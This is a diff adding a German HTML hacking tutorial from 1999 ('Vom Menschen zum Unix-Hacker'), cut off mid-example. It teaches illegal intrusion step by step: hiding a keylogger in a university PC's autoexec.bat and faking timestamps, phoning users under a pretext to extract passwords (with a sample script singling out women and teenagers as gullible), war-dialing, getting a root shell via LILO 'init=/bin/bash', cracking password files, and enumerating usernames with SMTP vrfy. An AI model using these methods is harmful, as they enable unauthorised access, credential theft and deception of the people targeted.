@@ -1,0 +1,2331 @@
+<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
+<html>
+<head>
+   <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+   <meta name="GENERATOR" content="Mozilla/4.51 [en] (X11; I; Linux 2.2.7 i686) [Netscape]">
+   <title>Human to Hacker Version 1.1</title>
+</head>
+<body bgcolor="#FFFFFF">
+
+<center>
+<h1>
+<font color="#FF0000">Vom Menschen zum Unix-Hacker</font></h1></center>
+
+<center>
+<h4>
+Author: TICK / THC</h4></center>
+
+<center>
+<h4>
+Last Update: 1999-07-04</h4></center>
+
+<center>
+<h4>
+<a href="mailto:T_I_C_K@gmx.net">Email: T_I_C_K@gmx.net</a></h4></center>
+
+<center>
+<h4>
+<img SRC="pic1.gif" ></h4></center>
+
+<p><br><a NAME="inhalt"></a>
+<h2>
+<font color="#990099">Inhaltsverzeichnis</font></h2>
+
+<ol>
+<li>
+<img SRC="godown.gif" height=10 width=14> <a href="#a0">Vorwort</a></li>
+
+<li>
+<img SRC="godown.gif" > <a href="#a1">Voraussetzungen</a></li>
+
+<li>
+<img SRC="godown.gif" > <a href="#a2">Wie bekomme ich (illegalen) Zugang
+zum Internet?</a></li>
+
+<li>
+<img SRC="godown.gif" > <a href="#a3">Die Literatur:</a></li>
+
+<br>Der unangenehme Teil
+<br>oder:
+<br>Der Schluessel zum Erfolg
+<li>
+<img SRC="godown.gif" > <a href="#a4">Wie komme ich weiter?</a></li>
+
+<li>
+<img SRC="godown.gif" > <a href="#a5">Wie rette ich meinen Arsch?</a></li>
+
+<li>
+<img SRC="godown.gif" > <a href="#a6">Ein paar Gedanken zum Sein eines
+Hackers</a></li>
+
+<li>
+<img SRC="godown.gif" > <a href="#a7">Yeah, time to become 31337.</a></li>
+
+<li>
+<img SRC="godown.gif" height=10 width=14> <a href="#a8">Ein Blick ueber
+die Schulter</a></li>
+
+<li>
+<img SRC="godown.gif" height=10 width=14> <a href="#a9">Persoenliche Sicherheit</a></li>
+
+<li>
+<img SRC="godown.gif" height=10 width=14> <a href="#a10">Letzte Worte</a></li>
+
+<li>
+<img SRC="godown.gif" height=10 width=14> <a href="#a11">Wichtige Links</a></li>
+
+<li>
+<a href="tools.html">Tools</a></li>
+</ol>
+
+<h3>
+
+<hr WIDTH="100%"></h3>
+<a NAME="a0"></a>
+<h3>
+<font color="#993399">Vorwort</font></h3>
+Auch wenn es fuer einen Anfaenger hart ist, aber ich werde gewisse Dinge
+wie NIS, Passwordcracker, Packetsniffer, et cetera nicht erklaeren; ich
+setze sie als bekannt voraus. Wenn du mit diesen Dingen arbeitest, dann
+wirst du sie verstehen, und in den Buechern/Docs werden sie haeufig auch
+erklaert.
+<p>Zeilen, die mit dem Groesser-als Zeichen '>' beginnen sind Eingaben
+(von dir).
+<br>Zeilen, die mit dem Kleiner-als Zeichen '&lt;' beginnen, stellen Ausgaben
+(z.B. von einem Programm) dar.
+<br>Befehle werden <b>fett</b> gedruckt, Captures <font color="#FF0000">rot</font>
+und Filenamen <font color="#33FF33">gruen</font> indiziert.
+<p>Bitte sendet alle Verbesserungen, Erweiterungen, Anregungen und <u>intelligenten</u>
+Fragen
+<br>an meine E-mail Adresse.
+<p>Dieses Paper soll <u>keine</u> Aufforderung zum Hacken sein!
+<p>For non-german guys:
+<br>Sorry, but I'm too lazy to translate this text to english.
+<br>But maybe sometimes I (or someone else) will.
+<br>&nbsp;
+<p><a NAME="a1"></a>
+<h3>
+<font color="#990099">Voraussetzungen</font></h3>
+Ja gut, die Voraussetzungen um Hacker zu werden.... also, das Wichtigste
+ist ein eiserner Wille; du musst Hacker werden wollen, mit jeder Zelle
+deines Koerpers ;) - aber nicht verkrampfen, denn dann wird der Fluss der
+Phantasie blockiert ;). Ein IQ >= 100 waer' auch ganz sinnvoll... hm, aja,
+'n Computer und 'n Modem... sind deine Hauptwerkzeuge. Du solltest in C
+programmieren koennen, da auf (fast) jedem Unix-System ein C- Compiler
+installiert ist und der groesste Teil der Sourcecodes in C geschrieben
+ist. Ich werde im Verlauf dieses Artikels ein Buch vorstellen, das meiner
+Meinung nach eine sehr gute und umfassende Grundlage fuer's Programmieren
+in C bietet, falls du schon eine Hochsprache beherrschst und dir einiges
+zutraust, dann reicht es, ein Buch ueber Unix Systemprog. zu lesen.
+<br>Desweiteren ist es sinnvoll ein Unix auf deinem Rechner zu installieren,
+z.B. Linux (fuer Anfaenger wuerde ich SuSE Linux empfehlen, es ist gut
+dokumentiert und zudem einfach zu installieren) oder FreeBSD (ist im Gegensatz
+zu Linux ein echtes Unix, da es von den urspruenglichen Quellen abstammt).
+Es gibt noch weitere Unixes fuer x86er wie BSDI, OpenBSD (sehr sicher und
+user-unfreundlich... ein echtes Maenner-Betriebssystem *G*), Solaris x86,
+SCO etc. aber das braucht dich ersteinmal nicht zu interessieren. ;-)
+<p>Bis du ein erfahrener Hacker bist koennen selbst bei grossem Engagement
+einige Jahre vergehen.
+<br>&nbsp;
+<p><a NAME="a2"></a>
+<h3>
+<font color="#990099">Wie bekomme ich (illegalen) Zugang zum Internet?</font></h3>
+Also mir kommen jetzt mehrere Moeglichkeiten in den Sinn, ich werde mal
+mit der Methode beginnen, die ich auch verwendet habe - sozusagen die,
+die ihren Praxistest schon bestanden hat.
+<p>Such dir eine nette Uni (Internet Provider, Firma mit Internet-Access)
+in deiner Naehe aus und mache dort ein Praktikum, einen Ferienjob oder
+einen Nebenjob.
+<br>Waehrend deiner Taetigkeit immer schoen die Augen nach Rechnern offenhalten,
+die ans Uni-Netz angeschlossen sind, die von den Studenten genutzt werden
+und allgemein zugaenglich sind. Haeufig steht irgendwo ein alter DOS- PC
+rum, oder es existieren PC-Pools. Such dir einen Rechner aus und sieh'
+dir seinen Aufbau genau an (<font color="#33FF33">autoexec.bat </font>&amp;
+<font color="#33FF33">config.sys</font>...).
+Beobachte wie er benutzt wird (laeuft er staendig, wird er nachts ausgeschaltet).
+Lass dich mal ganz
+<font color="#000000">plump</font> von 'nem Studenten
+in die Benutzung des Rechners einweisen. Dann benutze diesen Rechner fuer
+anonymous <i>FTP</i>,
+<i>HTTP</i> und den ganzen Kram, der kein Passwort
+erfordert, und wenn sich die Gelegenheit mal bietet, dann kopiere dir die
+<font color="#33FF33">autoexec.bat</font><font color="#000000">,</font><font color="#33FF33">config.sys</font>
+und den Stammverzeichnisbaum (<b>tree</b>) auf 'ne Diskette.
+<br>Kommen wir jetzt zum spannenden Teil. Es geht darum ein <i>TSR</i>-Programm
+zu installieren, welches die Tastatureingaben in eine Datei protokolliert
+. Um dieses <i>TSR</i>-Prog. so gut wie moeglich zu verstecken tarnt man
+es als ein anderes Prog. und fuegt einen entsprechenden Eintrag in die
+<font color="#33FF33">autoexec.bat</font>
+ein. Man kann z.B. den Mouse-Treiber durch einer Batch-Datei ersetzen,
+die erst unser <i>TSR</i> und dann den Mouse-Treiber aufruft o. ae.. Wenn
+du fit in ASM-Programmierung bist, dann kannst du das <i>TSR</i> vor
+<b>mem</b>
+verstecken (ich glaube, indem man irgendwie 'ne Memorygrenze veraendert
+- keine Ahnung).
+<br>Unter Umstaenden muss man das <i>TSR</i> mit einem HEX-Editor seinen
+Anforderungen anpassen. Du solltest bedenken, dass die Protokolldatei den
+ganzen Plattenplatz aufzehren koennte, also taeglich die Datei auf Diskette
+bringen und von der Platte entfernen. Desweiteren muessen die Timestamps
+angepasst werden - ja, Paranoia ist die Lebensversicherung eines Hackers.
+<br>So, um die ganze Angelegenheit zu beschleunigen tippe jeweils eine
+Batch-Datei fuer die Installation des <i>TSR</i>s, fuer das <b>move</b>'n
+der Protokolldatei und zum Deinstallieren des <i>TSR</i>s und zur Wiederherstellung
+des Orginalzustandes (Timestamps nicht vergessen). Teste deine Strategie
+und deine Batch-Dateien auf deinem Rechner, in der Praxis darf es keine
+Fehler mehr geben, alles muss schnell und reibungslos verlaufen.
+<p><u>Interpretation der Protokolldatei:</u>
+<br>Wenn du z.B. folgendes siehst:
+<br><font color="#FF0000">ftp blah.am.arsch.de</font>
+<br><font color="#FF0000">franz</font>
+<br><font color="#FF0000">schwanz</font>
+<br>... dann existiert auf dem Rechner "blah.am.arsch.de" ein Account mit
+dem Login "franz" und den Passwort "schwanz" - vorausgesetzt, dass die
+Eingaben richtig waren :).
+<br>Wichtig sind fuer dich erstmal die Rechner im Uni-Netz.
+<p>Wenn du ein paar Accounts gesammlt hast, musst du die Telefonnummer
+des Modems rausfinden, die dich mit dem Netz der Uni verbindet.
+<br>Die Nummer bekommst du ganz einfach: Ruf' bei der Uni an, gib dich
+als Student aus und frag' nach der Nummer - du musst sicher und ruhig sprechen.
+Haeufig steht die Nummer auch in 'nem Infoblatt vom Rechenzentrum (RZ)
+oder auf deren Web-Site.
+<br>Die Bequemlichkeit beim Verwalten und Verwenden von Account Informationen
+kommt dir beim Einloggen zugute, undzwar ist es (meistens) voellig egal
+auf welchem Rechner im Uni-Netz du landest, denn viele User verwenden das
+selbe Passwort auf mehreren Rechnern (auch in anderen Domains) oder es
+wird <i>NIS</i> (oder <i>NIS</i>+, <i>rdist</i>, <i>DCE</i>, <i>CORBA</i>
+etc) benutzt
+<br>So, wenn du in dem System bist, dann mache dich damit vertraut (in
+Uni-Systemen faellt man nicht so schnell auf).
+<br>Von der Uni aus, kannst du dann am Besten noch Domains hacken, die
+in deinem City-Tarif Bereich liegen um deine Telefonkosten zu verringern
+- auch wenn die gehackte Uni im City-Tarif Bereich ist, denn je mehr Einwahlpunkte
+du zum Internet hast um so besser.
+<br>Du kannst deine Telefongebueren auch sparen, indem du 'ne <i>PBX</i>
+hackst (im 0130/0800/0180*- Bereich oder von lokalen Firmen) oder durch
+<i>Blueboxing</i>
+- ist mir persoenlich zu gefaehrlich und zu auffaellig, da die Telekom
+gerne Phreaker kennen lernen will und <i>PBXs</i> meistens gute Intrusion
+Detection Systems besitzen. ;)
+<br>Bei Firmen ist die ganze Angelegenheit etwas gefaehrlicher als bei
+Universitaeten oder FHs.
+<p>Desweiteren kannst du natuerlich auch einfach in den Computer-Systemen
+Trojan-Horses einbringen oder ganz simpel den Leuten ueber die Schulter
+sehen, wenn sie sich in die Rechner einloggen.
+<p>Die "Experten" unter euch koennen einen <i>Vampire-Tap</i> oder einen
+Laptop mit Sniffer in deren Netz einbringen und so einfach die Account-Informationen
+aufzeichnen.
+<br>Der Vorteil des <i>Vampire-Taps</i> ist, dass es nicht durch Messgeraete
+entdeckt werden kann, die die Entfernung bis zum naechsten Ende/Bruch im
+Netzkabel messen.
+<p>Unter Windows (3.11) kannst du den Macrorecorder zur Aufzeichnug der
+Tastatureingaben verwenden... is' aber nicht so toll... mach deine eigenen
+Erfahrungen, es erfordert auf jeden Fall mehr Aufmerksamkeit von dir. Eine
+bessere Loesung ist da schon eine veraenderte <font color="#33FF33">WINSOCK.DLL</font>
+zu installieren, die alle Daten, die uebers Netz gehen aufzeichnet.
+<p>Natuerlich kannst du auch einen auf DOS, Win9? oder NT basierenden Sniffer
+verwenden.
+<p>Falls du schon einen Unix-/NT-Account hast, dann lad' dir einfach die
+Passwortdatei auf deinen Rechner und cracke die Passwoerter.
+<p>Oder ein temporaerer Freund mit Internet-Anschluss hilft dir weiter.
+;)
+<p>Wenn du physikalischen Zugriff auf einen Linux Rechner hast, der mit
+<i>LILO</i>
+gebootet wird,
+<br>dann tippe am <i>LILO</i>-Prompt hinter dem Bootlabel fuer Linux "init=/bin/bash
+rw" ein und der Rechner bootet im Single-User Mode und gibt dir eine root
+Shell ohne Passwortabfrage. Andernfalls kannst du den Rechner immer noch
+mit einer Bootdiskette hochfahren.
+<p>In der nach-Telekom-Monopol und Internet Aera bieten viele Telekomunikations-Firmen
+Internetzugaenge an, die einfach durch die Angabe der eigenen Bankverbindung
+o. ae. benutzt werden koennen. Am Besten ihr werft 'nen Blick in den <a href="salpeter.html">Artikel</a>
+von Salpeter (Kommentare hierzu bitte nicht an mich).
+<p>Und nun noch ein old-school Weg. Er erfordert weniger den technischen
+sondern mehr den physischen und mentalen Aufwand.
+<br>Such' dir ein/e Institut/Firma mit Internetanschluss (in deiner Stadt)
+aus. Jetzt musst du erstmal jedemenge Infos ueber dein Ziel sammeln, egal
+wie unwichtig sie erscheinen. Du brauchst z.B. den Namen des Admins und
+der User, Beziehungen zu anderen Instituten/Firmen. Um diese Dinge in Erfahrung
+zu bringen kannst du den Muell der Firma durchsuchen (sog. <i>Dumpster
+Diving</i>) oder dich mal 'n bisschen umhoeren. Jetzt nur noch die Modemnummer
+herausfinden:
+<br>Entweder einfach anrufen und als User ausgeben (wenn du den Namen eines
+Kunden hast, dann benutze ihn auch), der die Nummer vertroedelt hat, ausgeben
+oder den Telefonnummernbereich deines Ziels durchscannen.
+<br>Das Scannen geht wie folgt:
+<br>Du waehlst eine Nummer und horchst ob ein Modem dranhaengt - diese
+Aufgabe kann auch ein Prog. uebernehmen. Viele Firmen belegen mit ihren
+Tk-Anlagen (man koennte natuerlich auch die TK-Anlage zu seinem Vorteil
+manipulieren, aber dieses Thema soll nicht Bestandteil dieses Papers sein
+und wuerde auch viel zu weit fuehren) einen bestimmten Nummernbereich,
+z.B. eine 6stellige Nummer wobei die ersten 3 Zahlen statisch sind (z.B.
+911) und die letzten 3 Zahlen variieren (0 bis 999; wobei 0 meistens die
+Telefonzentrale, Pforte, etc ist). Nun waehlst du alle Nr. von 911-0 bis
+911-999 bis du ein Modem gefunden hast; falls du ein Anrufbeantworter entdeckst,
+dann versuche ihn zu hacken (weitere Infos).
+<br>Du kannst den Scan-Bereich einschraenken indem du dir die Durchwahlnummer
+des RZs, DVZs (Datenverarb. Zentrum) - oder wie sonst die Abteilung fuer
+die Rechnerverwaltung heisst - geben laesst und dann von dort startest
+(Bsp.: Durchwahl: 345, dann faengst du bei 911-300 an).
+<br>So jetzt Accounts besorgen.
+<br>Rufe einen User an - dabei solltest du folgendes beachten:
+<ol>
+<li>
+suche dir am Besten nur Frauen</li>
+
+<br>oder Jugendliche aus, da diese Personen leichtglaeubiger und techn.
+weniger versiert sind.
+<br>(<u>kein</u> Sexismus, reine Erfahrung :) )
+<li>
+keine direkten Mitarbeiter der Firma</li>
+
+<li>
+abends anrufen (zw. 19.00 und 21.00)</li>
+</ol>
+... so, nehmen wir mal an, dass der Admin der Firma HAQ_ME Mark Abene und
+der User Kathrin Mitnick heisst und gehen wir davon aus, dass du den Usernamen
+kennst, dann koennte ein Gespraech folgendermassen ablaufen:
+<pre>MA:&nbsp;&nbsp;&nbsp;&nbsp; Guten Abend, hier spricht Mark Abene, ich bin der Computer-Administrator
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; von HAQ_ME. Koennte ich wohl bitte Kathrin Mitnick sprechen?
+KM:&nbsp;&nbsp;&nbsp;&nbsp; Ja, am Apparat.
+MA:&nbsp;&nbsp;&nbsp;&nbsp; Oh gut, undzwar folgendes, wir hatten Gestern auf unserem Internet-Server
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; einen Gang-Bang und uns sind einige Daten dabei verloren gegangen, darunter
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; auch die Userdaten...
+KM:&nbsp;&nbsp;&nbsp;&nbsp; Oh Gott, wie schrecklich.
+MA:&nbsp;&nbsp;&nbsp;&nbsp; ... ja, ja, und ich hab' die Aufgabe die Daten von&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; unseren Backupbaendern zu restaurieren und die User-Datenbank wieder
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; neu einzurichten.
+KM:&nbsp;&nbsp;&nbsp;&nbsp; Aha...
+MA:&nbsp;&nbsp;&nbsp;&nbsp; Um meine Aufgabe zu komplettieren und ihnen wieder die einwandfreie
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Benutzung ihres Internetzugangs zu gewaehrleisten muesste ich wissen
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ob sie ihren alten Usernamen, kathrin, wieder verwenden wollen.
+KM:&nbsp;&nbsp;&nbsp;&nbsp; Oh ja, natuerlich.
+MA:&nbsp;&nbsp;&nbsp;&nbsp; Ok,... und wie lautete ihr Passwort?
+KM:&nbsp;&nbsp;&nbsp;&nbsp; Was!? Mein Passwort, warum haben sie davon keine Sicherungskopien
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; angefertigt?
+MA:&nbsp;&nbsp;&nbsp;&nbsp; Oh, es ist schoen so sicherheitsbewusste User zu haben, aber leider
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; selten.
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Aufgrund unser hohen Sicherheitsansprueche wird von der User-
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Datenbank keine Kopie angefertig... stellen sie sich mal vor, dass
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; die Backupbaender gestohlen werden.
+KM:&nbsp;&nbsp;&nbsp;&nbsp; Oh ja, sie haben recht. Also gut mein Passwort war "nirhtak".
+MA:&nbsp;&nbsp;&nbsp;&nbsp; Ok, ... dankesehr.
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Aufwiederhoeren.
+KM:&nbsp;&nbsp;&nbsp;&nbsp; Tschuess.</pre>
+Viel geredet fuer nur ein einziges Wort, aber es hat sich gelohnt. Du musst
+jederzeit ernst und ruhig klingen. Dieses Gerede ist sog. <i>Social Engeneering</i>.
+<br>Sollte es, aus welchen Gruenden auch immer, nicht klappen, dann kannst
+du auch ein Prog. verwenden, das das Passwort raet. Vielleicht funktionieren
+auch sog. Default-Accounts (z.B. Login: guest &amp; Password: guest).
+<br>&nbsp;
+<p><a NAME="a3"></a>
+<h3>
+<font color="#990099">Die Literatur</font></h3>
+Nachfolgend findest du eine kleine Tabelle mit Buechern, die du lesen solltest.
+<br>&nbsp;
+<br>&nbsp;
+<center><table BORDER COLS=4 WIDTH="100%" NOSAVE >
+<tr>
+<td>
+<center><b>Autor&nbsp;</b></center>
+</td>
+
+<td>
+<center><b>Titel</b></center>
+</td>
+
+<td>
+<center><b>Verlag</b></center>
+</td>
+
+<td>
+<center><b>Kommentar</b></center>
+</td>
+</tr>
+
+<tr>
+<td>Gerhard Willms</td>
+
+<td>Das C-Grundlagen Buch</td>
+
+<td>Data Becker</td>
+
+<td>Das Fundament der C-Programmierung&nbsp;</td>
+</tr>
+
+<tr>
+<td>Nemeth, Snyder, Seebass, Hein</td>
+
+<td>Unix Systemadministration&nbsp;
+<br>Handbook&nbsp;</td>
+
+<td>Prentice Hall</td>
+
+<td>Meiner Meinung nach das beste Buch fuer Unix-&nbsp;
+<br>Systemadministration&nbsp;
+<br>(eine dt. Auflage ist auch erhaeltlich)&nbsp;</td>
+</tr>
+
+<tr>
+<td>W. Richard Stevens</td>
+
+<td>Programmierung in der Unix-Umgebung</td>
+
+<td>Addison-Wesley</td>
+
+<td>Mal wieder ein perfektes Werk.&nbsp;
+<br>Stevens schreibt die besten Buecher fuer Unix/Internet&nbsp;
+<br>Programmierung&nbsp;</td>
+</tr>
+
+<tr>
+<td>W. Richard Stevens</td>
+
+<td>Programmieren von Unix-Netzen</td>
+
+<td>Prentice Hall / Hanser</td>
+
+<td>2te Auflage</td>
+</tr>
+
+<tr>
+<td>W. Richard Stevens</td>
+
+<td>TCP/IP Illustrated Vol. 1/2/3</td>
+
+<td>Addison-Wesley</td>
+
+<td>Infos ueber das TCP/IP Protokol und dessen Implementierung&nbsp;
+<br>sehr wichtig</td>
+</tr>
+
+<tr>
+<td>Garfinkel und Spafford</td>
+
+<td>Practical Unix &amp; Internet Security</td>
+
+<td>O'Reilley</td>
+
+<td>Das beste Buch in Sachen Unix- &amp; Internet-&nbsp;
+<br>Sicherheit</td>
+</tr>
+
+<tr>
+<td>Chapman und Zwicky</td>
+
+<td>Einrichten von Internet-&nbsp;
+<br>Firewalls</td>
+
+<td>O'Reilley</td>
+
+<td>beschreibt den Aufbau von Firewalls&nbsp;
+<br>leider nicht uptodate aber trotzdem sehr gut</td>
+</tr>
+
+<tr>
+<td>Cheswick und Bellovin</td>
+
+<td>Firewalls und Sicherheit im Internet</td>
+
+<td>Addison-Wesley</td>
+
+<td>Ebenfalls Firewalls-&nbsp;
+<br>aufbau, aber etwas theoretischer&nbsp;
+<br>und zeigt uebersichtlich moegliche Schwaechen auf.&nbsp;</td>
+</tr>
+
+<tr>
+<td>Bruce Schneier</td>
+
+<td>Angewandte Kryptographie</td>
+
+<td>Addison-Wesley</td>
+
+<td>Bruce Schneier hat bei dem Buch ganze Arbeit geleistet. Es ist sehr
+gut zu lesen und enthaelt viele Informationen</td>
+</tr>
+
+<tr>
+<td>Electronic Frontier Foundation</td>
+
+<td>Cracking DES</td>
+
+<td>O'Reilley</td>
+
+<td></td>
+</tr>
+
+<tr>
+<td></td>
+
+<td>Linux-Kernel-Programmierung</td>
+
+<td>Addison-Wesley</td>
+
+<td>Wichtige Infos ueber den Linux-Kernel werden hier leicht erklaert.
+<br>Ganz nuetzlich, wenn du mal die Linux-Firewall evaluieren willst. ;)</td>
+</tr>
+</table></center>
+
+<p>Na? 'Ne Menge Papier. Aber es lohnt sich wirklich den ganzen Kram zu
+lesen, glaub mir. Es gibt auch einige wenige gute Docs von Admins und Hackern
+- sie ersetzen aber nicht ein gutes Buch.
+<br>Du solltest auch die Security-Papers lesen, die im COAST-Archiv oder
+bei RootShell liegen... und die USENIX-Veroeffentlichungen nicht zu vergessen.
+<br>&nbsp;
+<p><a NAME="a4"></a>
+<h3>
+<font color="#990099">Wie komme ich weiter?</font></h3>
+Du solltest dir einen legalen Internet-Zugang besorgen.
+<br>Anschliessend schreibst du dich in Unix- &amp; Internet-Security&nbsp;
+Mailinglisten ein. Hier werden Hinweise auf Bugs in Programmen und Diensten
+gegeben und zusaetzlich auch noch kleine C-Programme oder Shell/Perl-Skripte
+mitgeliefert, die diese Bugs ausnutzen.
+<br>Trotz dieser Bequemlichkeit solltest du die old-school Methoden wie
+Trojan- Horses, etc nicht vergessen bzw. selbst dein Gehirn benutzen.
+<br>&nbsp;
+<center><table BORDER NOSAVE >
+<tr NOSAVE>
+<th NOSAVE>Adresse&nbsp;</th>
+
+<th>Subject&nbsp;</th>
+
+<th>Body&nbsp;</th>
+</tr>
+
+<tr>
+<td>&nbsp;<a href="mailto:best-of-security-request@suburbia.net">best-of-security-request@suburbia.net</a></td>
+
+<td></td>
+
+<td>subscribe best-of-security&nbsp;</td>
+</tr>
+
+<tr>
+<td>&nbsp;<a href="mailto:listserv@netspace.org">listserv@netspace.org</a></td>
+
+<td></td>
+
+<td>subscribe bugtraq&nbsp;</td>
+</tr>
+
+<tr>
+<td>&nbsp;<a href="mailto:majordomo@lists.gnac.net">majordomo@lists.gnac.net</a></td>
+
+<td></td>
+
+<td>subscribe firewalls&nbsp;</td>
+</tr>
+
+<tr>
+<td>&nbsp;<a href="mailto:fwall-users-request@tis.com">fwall-users-request@tis.com
+(???)</a></td>
+
+<td></td>
+
+<td>subscribe fwall-users&nbsp;</td>
+</tr>
+
+<tr>
+<td>&nbsp;<a href="mailto:majordomo@nsmx.rutgers.edu">majordomo@nsmx.rutgers.edu</a></td>
+
+<td></td>
+
+<td>subscribe www-security&nbsp;</td>
+</tr>
+</table></center>
+
+<p>Desweiteren kannst du einige Newsgroups mitlesen aber es ist viel Muell
+dabei und in den Hacker-Newsgroups ist schonmal garnichts zuholen.
+<p>Ok, gehen wir mal davon aus, dass du root Rechte hast. Eine Moeglichkeit
+um weitere Netze zu hacken besteht darin auf dem lokalen System nach Dateien
+wie <font color="#33FF33">.rhosts</font>, <font color="#33FF33">.netrc</font>
+und <font color="#33FF33">.forward</font> zu suchen; oder E-Mail nach Passworten
+(oder anderen interessanten Informationen) zu durchforsten. Um dir die
+Arbeit ueber 20.000 User zu checken (und beim Gebrauch von <i>NFS</i> noch
+zusaetzlich die UID zu wechseln) abzunehmen hab ich ein kleines Tool namens
+Searcher geschrieben.
+<br>Wenn du von einigen Usern das Passwort gecrackt hast, dann solltest
+du gucken von welchen Hosts sie sich einloggen, dazu kannst du <b>last</b>,
+<b>w</b>
+oder aehnliches benutzen, du koenntest auch die Hosts aufs Korn nehmen
+in die sie sich einloggen, herausfinfen kannst du das z.B. mit <b>ps
+</b>(mit
+w-Option), <b>netstat</b>, oder du verifizierst die Mail-Aliases (<font color="#33FF33">/etc/aliases</font>)
+bzw. <font color="#33FF33">.forward</font> um zu sehen wohin ein User seine
+E-Mail umleitet.
+<br>Jetzt solltest du noch herausfinden welchen Usernamen er auf dem entfernten
+Host benutzt (in <font color="#33FF33">.forward</font> und in <font color="#33FF33">/etc/aliases</font>
+muss es angegeben werden; z.B. "remote-user@other-site.com"), dazu kannst
+du S<i>MTP</i> verwenden... Bsp.: User "victim" auf dem lokalen System
+(Realnamen: Hackers Victim) hat sich mit <b>telnet</b> auf dem Rechner
+"host.account.edu" eingeloggt.
+<pre>> telnet host.account.edu 25
+&lt; Trying 123.10.0.1...
+&lt; Connected to host.account.edu.
+&lt; Escape character is '^]'.
+&lt; 220-host.account.edu Sendmail 8.6.9/8.6.9 ready at Mon, 21 Jul 1997
+&lt; 16:19:56 +0200
+&lt; 220 ESMTP spoken here
+> vrfy victim
+&lt; 550 victim... User unknown
+> vrfy hvictim
+&lt; 250 Hackers Victim &lt;hvictim@host.account.edu>
+> quit
+&lt; 221 host.account.edu closing connection
+&lt; Connection closed by foreign host.</pre>
+Der User verwendet also auf beiden Hosts nicht den selben Usernamen, da
+das Kommando "vrfy victim" von <i>Sendmail</i> (weitverbreitetes E-Mail-Verteilungs
+Programm, das an Port 25 haengt) mit "550 victim... User unknown" beantwortet
+wird.
+<br>Jetzt kannst du einige Kombinationen (z.B. aus den Initialen des Users)
+ausprobieren... BINGO!... "hvictim" ist der Username, den "victim" auf
+"host.account.edu" benutzt.
+<br>Bei vielen Mailservern wurde das <b>vrfy</b> Kommando aus Sicherheitsgruenden
+abgeschaltet. Jetzt koenntest du nur noch versuchen den Usernamen zu erraten,
+indem du E-Mails an den Server schickst und die Error-Messages des Servers
+ueberpruefst, die du fuer nicht vorhandene User zurueck bekommst - dieses
+Verfahren ist nicht gerade sehr unauffaellig, also auch nicht zu empfehlen.
+<p>Du kannst auch noch <b>finger</b> (wird aber aus Sicherheitsgruenden
+haeufig nicht angeboten) oder aber <b>rusers </b>benutzen um alle eingeloggten
+User auf "host.account.edu" zu erfragen. Mit <b>finger</b> kannst du auch
+Loginnamen erraten, dafuer schreibst du einfach ein Shell-Script, das aus
+einem Dictionary bis zu n Woerter einliehst und en bloc an <b>fingerd</b>
+schickt.
+<p>Falls du keinen Erfolg haben solltest oder diese Dienste nicht angeboten
+werden bist du immer noch nicht verloren. Wenn der User gerade eingeloggt
+ist, dann rufe das Programm <b>netstat</b> (dient unter anderem zum Debuggen
+von Netzwerkproblemen) auf.
+<pre>> netstat
+&lt; Active Internet connections
+&lt; Proto&nbsp;&nbsp;&nbsp; Recv-Q Send-Q Local Address&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Foreign Address&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (State)
+&lt; User
+&lt; victim
+&lt; tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; localhost:1032&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; host.account.edu:telnet&nbsp;&nbsp;&nbsp;&nbsp; ESTABLISHED
+&lt; root
+&lt; udp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; localhost:3043&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *:*
+&lt; Active UNIX domain sockets
+&lt; Proto RefCnt&nbsp; Flags&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Type&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; State&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Path
+&lt; unix&nbsp; 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ ACC ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SOCK_STREAM&nbsp;&nbsp;&nbsp;&nbsp; LISTENING&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /tmp/gpmctl
